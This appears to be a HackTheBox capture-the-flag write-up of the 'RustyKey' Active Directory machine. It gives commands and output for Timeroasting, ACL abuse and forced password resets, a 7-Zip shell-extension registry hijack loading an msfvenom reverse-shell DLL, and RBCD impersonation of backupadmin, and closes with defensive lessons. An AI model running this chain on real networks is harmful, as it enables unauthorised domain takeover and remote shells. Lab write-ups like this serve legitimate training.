---
title: RustyKey
categories: [HackTheBox]
tags: [active-directory, ldap, kerberos, timeroasting, acl-abuse, group-membership, registry-hijacking, shell-extension-hijacking, constrained-delegation, resource-based-constrained-delegation, s4u2self, s4u2proxy]
media_subpath: /images/hackthebox_rustykey/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/c458b48070ca6f3073128d085c9ee247.png'
---

## Summary

**RustyKey** is a Hard-rated HackTheBox Active Directory machine that demonstrates a sophisticated attack chain involving Timeroasting, ACL abuse, registry hijacking, and Resource-Based Constrained Delegation (RBCD) exploitation. The attack begins with initial credentials for a low-privileged user. Through Timeroasting, we extract SNTP hashes from computer accounts and crack them to obtain machine account credentials. By exploiting ACL permissions, we manipulate group memberships and change user passwords. We then exploit a registry hijacking vulnerability in the 7-Zip shell extension to gain code execution on a workstation. Finally, we configure Resource-Based Constrained Delegation to impersonate the `backupadmin` account, enabling complete domain compromise.

## Initial Access

### Provided Credentials

As is common in real-world Windows penetration tests, we start with credentials for the following account:
- **Username**: `rr.parker`
- **Password**: `8#t5HE8L!W3A`

> This represents a realistic scenario where initial access is gained through social engineering, password reuse, or other initial compromise vectors.
{: .prompt-info}

## Initial Enumeration

### LDAP Connection and NTLM Status

We begin by testing LDAP connectivity:

```bash
nxc ldap $IP -u $USERAD -p $PASS
```

```
LDAP        10.10.11.75     389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
LDAP        10.10.11.75     389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
```

> **Critical Security Configuration**: The domain controller shows `(NTLM:False)`, indicating that NTLM authentication is **disabled**. This means we must use **Kerberos authentication exclusively** for all connections throughout the penetration test. All authentication attempts will require the `-k` flag to force Kerberos authentication, and we must ensure our system time is synchronized with the domain controller as Kerberos is time-sensitive.
{: .prompt-danger}

### Time Synchronization

Since Kerberos is time-sensitive, we synchronize our system time with the domain controller:

```bash
sudo ntpdate -s $IP
```

After time synchronization, we can successfully authenticate:

```bash
nxc ldap $IP -u $USERAD -p $PASS -k
```

```
LDAP        10.10.11.75     389    DC               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A
```

![LDAP Authentication Success](file-20250810032321352.png)

### User Enumeration

We enumerate domain users:

```bash
nxc ldap $IP -u $USERAD -p $PASS -k --users
```

```
LDAP        10.10.11.75     389    DC               [*] Enumerated 11 domain users: rustykey.htb
Username                    Last PW Set       BadPW  Description
Administrator              2025-06-04 19:52:22 0     Built-in account for administering the computer/domain
Guest                      <never>            0      Built-in account for guest access to the computer/domain
krbtgt                     2024-12-26 21:53:40 0     Key Distribution Center Service Account
rr.parker                  2025-06-04 19:54:15 0
mm.turner                  2024-12-27 07:18:39 0
bb.morgan                  2025-11-07 18:01:40 0
gg.anderson                2025-11-07 18:01:40 0
dd.ali                     2025-11-07 18:01:40 0
ee.reed                    2025-11-07 18:01:40 0
nn.marcos                  2024-12-27 08:34:50 0
backupadmin                2024-12-29 21:30:18 0
```

![User Enumeration Results](file-20250810032440256.png)

### Group Membership Enumeration

Enumerating Users that are member of the `Remote Management Users`, we see that the groups `IT` and `Support` are member. We enumerate members of those specific groups:

```bash
nxc ldap $FQDN -k -u $USERAD -p $PASS --groups 'Support'
nxc ldap $FQDN -k -u $USERAD -p $PASS --groups 'IT'
```

```
Support Group Members:
ee.reed

IT Group Members:
gg.anderson
bb.morgan
```

> The enumeration reveals that `ee.reed` is in the Support group, while `gg.anderson` and `bb.morgan` are in the IT group. These accounts may have different permissions or access to different resources.
{: .prompt-info}

## Timeroasting Attack

### Understanding Timeroasting

Timeroasting is an attack technique that exploits the MS-SNTP (Microsoft Simple Network Time Protocol) authentication mechanism. When a computer account authenticates to synchronize time with a domain controller, the authentication can be captured and cracked offline to obtain the computer account's password.

### Performing Timeroasting

We use NetExec's Timeroasting module to extract SNTP hashes from computer accounts:

```bash
nxc smb $FQDN -u $USERAD -p $PASS -k -M timeroast
```

> Command breakdown:
>- `nxc smb` : NetExec SMB module
>- `-u $USERAD -p $PASS -k` : Authenticate with Kerberos
>- `-M timeroast` : Execute the Timeroasting module
{: .prompt-info}

The attack successfully extracts SNTP hashes from multiple computer accounts:

```
TIMEROAST   dc.rustykey.htb 445    dc               1000:$sntp-ms$4646b11234692b417fa386908c45f268$...
TIMEROAST   dc.rustykey.htb 445    dc               1103:$sntp-ms$181963bc739b14e042bf3cf500b39490$...
TIMEROAST   dc.rustykey.htb 445    dc               1104:$sntp-ms$765971317e6a8801f12f1c346d6db7b2$...
TIMEROAST   dc.rustykey.htb 445    dc               1105:$sntp-ms$a8a3f711bfdc8ad9c2689c507a810a3e$...
TIMEROAST   dc.rustykey.htb 445    dc               1106:$sntp-ms$5a11c1adb5008d921e3dc1dd812f4bde$...
TIMEROAST   dc.rustykey.htb 445    dc               1107:$sntp-ms$789025abd9c722fe3e706af232b58839$...
TIMEROAST   dc.rustykey.htb 445    dc               1118:$sntp-ms$4630650d6df1cf5743af3e67fa2030c9$...
TIMEROAST   dc.rustykey.htb 445    dc               1119:$sntp-ms$914125b213f8670b85f7c3b1c150e492$...
TIMEROAST   dc.rustykey.htb 445    dc               1120:$sntp-ms$0b4cdac5896032f4d254a686c214a808$...
TIMEROAST   dc.rustykey.htb 445    dc               1121:$sntp-ms$fb63435b5b2119f379993354cf424774$...
TIMEROAST   dc.rustykey.htb 445    dc               1122:$sntp-ms$ec3dbc7e11c5ba8aed4f51762bb765d8$...
TIMEROAST   dc.rustykey.htb 445    dc               1123:$sntp-ms$921664b715134608eb88685ff19df591$...
TIMEROAST   dc.rustykey.htb 445    dc               1124:$sntp-ms$a76844684764fcfc117e3be44d1d144d$...
TIMEROAST   dc.rustykey.htb 445    dc               1125:$sntp-ms$092af0d7c929a9fb83138de09f4e2129$...
TIMEROAST   dc.rustykey.htb 445    dc               1126:$sntp-ms$d47f9460148f5603199524bdaabb6071$...
TIMEROAST   dc.rustykey.htb 445    dc               1127:$sntp-ms$644a3c1a3b14255bde6841dc09ca4e8c$...
```

> **Timeroasting Success**: We successfully extracted SNTP hashes from multiple computer accounts. These hashes can be cracked offline to obtain the computer account passwords.
{: .prompt-warning}

### Cracking the SNTP Hash

We crack the extracted SNTP hashes using `hashcat`:

```bash
hashcat ./timeroast --username --show
```

Hashcat automatically detects the hash type as MS SNTP:

```
31300 | MS SNTP | Network Protocol

1125:$sntp-ms$1567fae4dc8f2e78f85c5d5214c413e0$...:Rusty88!
```

> The password for the computer account with RID 1125 is `Rusty88!`. We need to identify which computer account this corresponds to.
{: .prompt-info}

![Timeroasting Hash Cracking](file-20250810032940594.png)

### Identifying the Computer Account

We retrieve the domain SID and convert the RID to identify the computer account:

```bash
lookupsid.py -k $DOMAIN/$USERAD:$PASS@$FQDN -domain-sids 0
```

```
[*] Domain SID is: S-1-5-21-3316070415-896458127-4139322052
```

Using PowerView, we convert the SID to identify the account:

```bash
powerview -k --use-ldap $DOMAIN/$USERAD:$PASS@$FQDN
ConvertFrom-SID -ObjectSID S-1-5-21-3316070415-896458127-4139322052-1125
```

```
RUSTYKEY\IT-Computer3$
```

> The computer account `IT-Computer3$` has the password `Rusty88!`. Machine accounts can be used for various attacks, including constrained delegation exploitation.
{: .prompt-info}

## ACL Enumeration and Abuse

### Enumerating Writable Objects

We enumerate writable objects using `bloodyAD`:

```bash
bloodyAD --host $FQDN -k -d $DOMAIN -u $USERAD -p $PASS get writable
```

The enumeration reveals several writable objects:

```
distinguishedName: CN=TPM Devices,DC=rustykey,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=rustykey,DC=htb
permission: WRITE

distinguishedName: CN=IT-Computer3,OU=Computers,OU=IT,DC=rustykey,DC=htb
permission: CREATE_CHILD; WRITE
```

None of those gave us interesting rights, but looking at the bloodhound output, we can see that we now have `AddSelf` over `HELPDESK` group

![ACL Enumeration Results](file-20250810033005311.png)

![Bloodhound ACL Visualization](file-20250810033017284.png)

### Adding IT-Computer3$ to HELPDESK Group

Since we have GenericWrite permissions over `IT-Computer3`, we can add it to groups:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS add groupMember "HELPDESK" "IT-COMPUTER3$"
```

```
[+] IT-COMPUTER3$ added to HELPDESK
```

Looking at the bloodhound the rights we would inherit from `HELPDESK` we can see that we now have:
- `AddMember` over `PROTECTED OBJECTS`
- `ForceChangePassword` over `bb.morgan`,`gg.anderson`,`ee.reed`,`dd.ali`
- `GenericWrite` over `dd.ali`

![Adding Computer to HELPDESK Group](file-20250810033159039.png)

![Group Membership Confirmation](file-20250810033221794.png)

> By adding `IT-Computer3$` to the HELPDESK group, we may gain additional permissions or access to resources that the HELPDESK group has access to.
{: .prompt-info}

### Removing Groups from Protected Objects

We also remove the IT and Support groups from the Protected Objects group:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS remove groupMember "Protected Objects" "IT"
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS remove groupMember "Protected Objects" "Support"
```

```
[-] IT removed from Protected Objects
[-] Support removed from Protected Objects
```

> **AddMember Permission Includes Remove**: The `AddMember` permission over the Protected Objects group includes the right to both add and remove members from the group. This is a common Active Directory permission behavior where `AddMember` grants full group membership management capabilities, not just the ability to add members.
{: .prompt-info}

> Removing groups from Protected Objects may allow us to modify accounts that were previously protected, enabling password changes or other modifications.
{: .prompt-info}

### Changing User Passwords

We change passwords for users in the IT and Support groups:

```bash
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS set password "bb.morgan" 'P@$$word123!'
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS set password "gg.anderson" 'P@$$word123!'
bloodyAD -d $DOMAIN --host $FQDN -u $USERAD -k -p $PASS set password "ee.reed" 'P@$$word123!'
```

```
[+] Password changed successfully!
[+] Password changed successfully!
[+] Password changed successfully!
```

> We successfully changed passwords for `bb.morgan`, `gg.anderson`, and `ee.reed` to `P@$$word123!`. These accounts may have different privileges or access to workstations.
{: .prompt-info}

### Verifying Password Changes

We verify that the password changes worked:

```bash
nxc ldap $FQDN -k -u {bb.morgan,gg.anderson,ee.reed} -p 'P@$$word123!' --continue-on-success
```

However, we discover that `bb.morgan` authenticates with the new password, while the others have issues:

```
LDAP        DC.rustykey.htb 389    DC               [+] rustykey.htb\bb.morgan:P@$$word123!
LDAP        DC.rustykey.htb 389    DC               [-] rustykey.htb\gg.anderson:P@$$word123! KDC_ERR_CLIENT_REVOKED
LDAP        DC.rustykey.htb 389    DC               [-] rustykey.htb\ee.reed:P@$$word123! 569
```

> `bb.morgan` successfully authenticates with the new password `P@$$word123!`, which we can use for further enumeration. The other accounts (`gg.anderson` and `ee.reed`) have authentication issues, but `bb.morgan` is sufficient for our purposes.
{: .prompt-info}

## Workstation Access and Registry Hijacking

### Accessing bb.morgan Account

We generate a Kerberos configuration file and access the system via WinRM:

```bash
nxc smb $FQDN -k -u bb.morgan -p 'P@$$word123!' --generate-krb5-file krb5
export KRB5_CONFIG=krb5
KRB5CCNAME=bb.morgan.ccache evil-winrm -i $FQDN -r $DOMAIN
```

We successfully connect as `bb.morgan`:

```
*Evil-WinRM* PS C:\Users\bb.morgan\Documents>
```

![WinRM Access as bb.morgan](file-20250810034219917.png)

### Discovering Internal Documentation

On the Desktop, we discover an `internal.pdf` file that contains important information:

![Internal PDF Contents](file-20250810034311382.png)

The document states:
- "Extended access has been temporarily granted to allow testing and troubleshooting of file archiving features across shared workstations"
- "Some newer systems handle context menu actions differently, so registry-level adjustments are expected during this phase"

> **Key Information**: The document mentions "registry-level adjustments" and "context menu actions", suggesting that registry modifications related to shell extensions or context menu handlers may be possible. This could indicate a registry hijacking opportunity.
{: .prompt-warning}

### Discovering 7-Zip Installation

We check for installed programs and discover 7-Zip:

```powershell
PS C:\Program Files> dir
d-----       12/26/2024   8:24 PM                7-Zip
```

### Identifying 7-Zip Shell Extension CLSID

We search the registry for 7-Zip shell extension entries:

```powershell
reg query hklm\software\Classes\CLSID /f "7-Zip" /s
```

The search reveals the 7-Zip shell extension CLSID:

```
HKEY_LOCAL_MACHINE\software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}
    (Default)    REG_SZ    7-Zip Shell Extension

HKEY_LOCAL_MACHINE\software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32
    (Default)    REG_SZ    C:\Program Files\7-Zip\7-zip.dll
```

> **Registry Hijacking Opportunity**: The 7-Zip shell extension is registered in the registry. If we have write permissions to the `InprocServer32` key, we can hijack it by replacing the DLL path with a malicious DLL. When the shell extension is loaded (e.g., when right-clicking in Explorer), our malicious DLL will execute.
{: .prompt-danger}

## Shell Extension Hijacking

### Creating Malicious DLL

We create a reverse shell DLL using `msfvenom`:

```bash
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.77 LPORT=9999 -f dll -o shell.dll
```

```
Payload size: 354 bytes
Final size of dll file: 9216 bytes
Saved as: shell.dll
```

### Uploading the Malicious DLL

We upload the malicious DLL to the target system:

```powershell
*Evil-WinRM* PS C:\> mkdir temp
*Evil-WinRM* PS C:\temp> upload shell.dll
```

```
Info: Uploading /home/h4z4rd0u5/HTB/Hard/RustyKey/shell.dll to C:\temp\shell.dll
Info: Upload successful!
```

### Hijacking the Registry Entry

We modify the registry to point the 7-Zip shell extension to our malicious DLL. We use `RunasCs` to execute the registry modification command as `ee.reed` from the Support group:

```powershell
.\run.exe ee.reed 'P@$$word123!' reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "c:\temp\shell.dll" /f
```

```
The operation completed successfully.
```

> **Registry Hijacking Complete**: We successfully modified the registry to point the 7-Zip shell extension to our malicious DLL using `RunasCs` to execute the command as `ee.reed` from the Support group. When the shell extension is loaded (typically when right-clicking in Windows Explorer), our DLL will execute and provide a reverse shell.
{: .prompt-warning}

### Triggering the Shell Extension

We need to trigger the shell extension to load our malicious DLL. Setting up a listener:

```bash
rlwrap nc -lvnp 9999
```

![Shell Extension Trigger](file-20250810042223733.png)

![Reverse Shell Connection](file-20250810042616006.png)

We successfully receive a reverse shell:

```
Connection from 10.10.11.75:63325
Microsoft Windows [Version 10.0.17763.7434]

C:\temp>whoami
rustykey\mm.turner
```

![Shell as mm.turner](file-20250810042601155.png)

> **Code Execution Success**: We successfully gained code execution as `mm.turner` through the shell extension hijacking attack. The malicious DLL was loaded when the shell extension was triggered.
{: .prompt-info}

## Resource-Based Constrained Delegation (RBCD)

### Understanding RBCD

Resource-Based Constrained Delegation (RBCD) allows a service account to impersonate users when accessing a specific resource. Unlike traditional constrained delegation, RBCD is configured on the resource (target) side, not the service account side.

![RBCD Configuration](file-20250810042708821.png)

### Configuring RBCD

With access as `mm.turner`, we can configure RBCD. We set the `PrincipalsAllowedToDelegateToAccount` attribute on the DC computer object to allow `IT-Computer3$` to delegate to it:

```powershell
PS C:\> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount "IT-COMPUTER3$"
```


> **RBCD Configuration**: We successfully configured Resource-Based Constrained Delegation, allowing `IT-Computer3$` to impersonate users when accessing the DC. This enables us to use S4U2Self and S4U2Proxy to obtain tickets for other users.
{: .prompt-warning}

### Verifying Delegation

We verify the delegation configuration:

```bash
findDelegation.py -k -dc-host $HOSTNAME -dc-ip $IP $DOMAIN/$USERAD:$PASS
```

```
AccountName    AccountType  DelegationType              DelegationRightsTo  SPN Exists
-------------  -----------  --------------------------  ------------------  ----------
IT-Computer3$  Computer     Resource-Based Constrained  DC$                 No
DC$            Computer     Unconstrained               N/A                 Yes
```

> The delegation is properly configured. `IT-Computer3$` now has Resource-Based Constrained Delegation rights to `DC$`.
{: .prompt-info}

### Exploiting RBCD with S4U2Self/S4U2Proxy

We use `getST.py` to exploit RBCD and impersonate the `backupadmin` account:

```bash
getST.py -spn LDAP/$FQDN -impersonate backupadmin $DOMAIN/'IT-COMPUTER3$':'Rusty88!' -dc-ip $IP
```

> Command breakdown:
>- `getST.py` : Impacket tool to request service tickets
>- `-spn LDAP/$FQDN` : Service Principal Name for the domain controller
>- `-impersonate backupadmin` : User to impersonate
>- `$DOMAIN/'IT-COMPUTER3$':'Rusty88!'` : Computer account credentials
>- `-dc-ip $IP` : Domain controller IP
{: .prompt-info}

The attack is successful:

```
[*] Getting TGT for user
[*] Impersonating backupadmin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in backupadmin@LDAP_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

> **RBCD Exploitation Success**: We successfully obtained a service ticket for `backupadmin` by exploiting Resource-Based Constrained Delegation. The S4U2Self/S4U2Proxy protocol allows us to impersonate `backupadmin` when accessing the DC.
{: .prompt-danger}

## Domain Compromise

### Accessing Domain Controller

We use the obtained ticket to access the domain controller:

```bash
export KRB5CCNAME=backupadmin@LDAP_DC.rustykey.htb@RUSTYKEY.HTB.ccache
nxc ldap $FQDN -k --use-kcache
```

```
LDAP        DC.rustykey.htb 389    DC               [+] rustykey.htb\backupadmin from ccache (Pwn3d!)
```

> We successfully authenticated as `backupadmin` using the delegated ticket. The `(Pwn3d!)` indicator shows we have administrative access.
{: .prompt-info}

### Accessing Administrator Shares

We access the Administrator's Desktop to retrieve the root flag:

```bash
smbclient.py -k $FQDN
```

```bash
# use c$
# cd users/administrator/desktop
# ls
-rw-rw-rw-         34  Fri Nov  7 09:01:56 2025 root.txt
# get root.txt
```

![Root Flag Retrieved](file-20250810043225255.png)

## Conclusion

### Quick Recap

- Initial access was provided through credentials for `rr.parker`
- NTLM authentication was disabled, requiring Kerberos authentication exclusively
- Timeroasting attack extracted SNTP hashes from computer accounts
- Computer account password (`IT-Computer3$`) was cracked
- ACL enumeration revealed GenericWrite permissions over `IT-Computer3`
- Group membership manipulation added `IT-Computer3$` to HELPDESK
- Protected Objects group members were removed to enable password changes
- User passwords were changed to gain access to workstations
- Registry hijacking of 7-Zip shell extension provided code execution
- Resource-Based Constrained Delegation was configured and exploited
- S4U2Self/S4U2Proxy attack impersonated `backupadmin`
- Complete domain compromise was achieved

### Lessons Learned

- **NTLM Security**: Disabling NTLM authentication is a good security practice but requires proper Kerberos configuration
- **Timeroasting**: Computer accounts should use strong, randomly generated passwords to resist Timeroasting attacks
- **Access Control Lists**: Proper ACL management is critical to prevent unauthorized modifications to computer accounts
- **Group Protection**: Protected Objects group should be carefully managed to prevent unauthorized removals
- **Registry Security**: Shell extension registry keys should be protected to prevent hijacking attacks
- **Constrained Delegation**: Resource-Based Constrained Delegation should be carefully configured and monitored
- **S4U2Self/S4U2Proxy**: The S4U2 protocol can be exploited when delegation is misconfigured
- **Defense in Depth**: Multiple security controls should protect critical systems and prevent privilege escalation
- **Machine Account Security**: Computer accounts should be treated with the same security considerations as user accounts
